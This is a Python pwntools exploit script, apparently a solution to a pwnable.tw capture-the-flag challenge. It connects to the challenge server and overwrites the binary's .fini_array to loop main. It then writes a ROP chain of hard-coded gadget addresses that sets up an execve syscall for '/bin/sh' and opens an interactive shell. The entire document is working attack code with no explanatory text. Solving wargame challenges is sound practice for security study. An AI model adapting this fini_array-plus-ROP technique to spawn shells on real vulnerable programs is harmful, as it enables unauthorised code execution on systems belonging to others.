from pwn import *

ip_addr = "chall.pwnable.tw"
port = 10105

connection = remote(ip_addr, port)
loop_addr = 0x402960
main_addr = 0x401b6d
fini_array = 0x4b40f0
offset = 0

gadgets = \
        [
                {"on_next_loc":True, "addr": p64(loop_addr) + p64(main_addr), "desc": "call main; call loop;"},
                {"on_next_loc":True, "addr": p64(0x048a41d) + p64(fini_array + 11*8), "desc": "pop rdi; ret"},
                {"on_next_loc":True, "addr": p64(0x44a2e6) + p64(0), "desc": "pop rdx; ret"},
                {"on_next_loc":True, "addr": p64(0x411364) + p64(0), "desc": "pop rsi; ret"},
                {"on_next_loc":True, "addr": p64(0x41e4af) + p64(59), "desc": "pop rax; ret"},
                {"on_next_loc":True, "addr": p64(0x446cc1) + b'/bin/sh\x00', "desc": "syscall"},
                {"on_next_loc":False, "addr": p64(0x474fbe), "desc": "leave; ret"},
        ]

for i in gadgets:
    if i["on_next_loc"] is False:
        addr = fini_array
    else:
        addr = fini_array + offset
    log.info("Gadget: " + i["desc"] + " on: "+ str(hex(addr)) + " " + str(offset))
    connection.sendlineafter("addr:", str(addr))
    connection.sendafter("data:", i["addr"])
    offset = offset + 16

connection.interactive()
